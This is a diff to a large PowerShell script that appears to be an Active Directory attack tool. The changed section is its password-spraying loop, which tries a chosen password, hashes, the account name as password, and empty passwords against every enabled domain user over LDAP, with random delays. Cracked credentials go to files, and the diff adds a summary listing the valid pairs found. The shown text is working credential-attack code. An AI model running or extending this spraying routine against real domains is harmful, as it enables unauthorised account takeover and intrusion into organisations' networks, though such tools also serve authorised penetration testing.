@@ -3740,7 +3740,8 @@ while (`$true) {
             Write-Host
         }
 
-
+        
+        $SuccessUsers = @()
         foreach ($UserToSpray in $EnabledDomainUsers) {
             $Delay = Get-Random -Minimum 5 -Maximum 20
             Start-Sleep -Milliseconds $Delay
@@ -3794,18 +3795,27 @@ while (`$true) {
                     elseif ($Attempt.IndexOf("NameService              :") -ne -1) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
+
+                        $SuccessfulUser = "$Domain\$UserToSpray"
+                        $SuccessUsers += $SuccessfulUser
+                        
                         "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
                     }
                 }
 
                 # Password Spraying
                 if ($SprayPassword -ne "") {
-
+                    
+                    
                     $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", $UserToSpray, $SprayPassword)
         
                     if ($Attempt.name -ne $null) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
+                        
+                        $SuccessfulUser = "$Domain\$UserToSpray"
+                        $SuccessUsers += $SuccessfulUser
+                        
                         "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
                     }
 
@@ -3813,10 +3823,7 @@ while (`$true) {
                         Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
                     }
-    
                 }
-
-
                 # Account as password
                 if ($AccountAsPassword) {
 
@@ -3825,6 +3832,10 @@ while (`$true) {
                     if ($Attempt.name -ne $null) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
+                        
+                        $SuccessfulUser = "$Domain\$UserToSpray"
+                        $SuccessUsers += $SuccessfulUser
+                        
                         "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
                     }
 
@@ -3845,6 +3856,10 @@ while (`$true) {
                     if ($Attempt.name -ne $null) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
+                        
+                        $SuccessfulUser = "$Domain\$UserToSpray"
+                        $SuccessUsers += $SuccessfulUser
+                        
                         "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
                     }
 
@@ -3861,6 +3876,34 @@ while (`$true) {
         
             }
         }
+
+if ($SuccessUsers.Count -gt 0 ){
+Write-Host
+Write-Host
+Write-Host "Valid credential pairs found: " -NoNewline
+Write-Host $SuccessUsers.Count
+Write-Host
+foreach ($User in $SuccessUsers) {
+    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+    Write-Host "$User"
+    
+    }
+    Write-Host
+    Write-Host "[*] " -ForegroundColor "Yellow" -no
+    Write-Host "Output written to $Spraying"
+    Write-Host
+}
+
+elseif ($SuccessUsers.Count -eq 0 ){
+Write-Host
+Write-Host
+Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+Write-Host "No valid credential pairs found"
+Write-Host
+}
+ 
+ 
+ 
     }
 
     ################################################################################################################
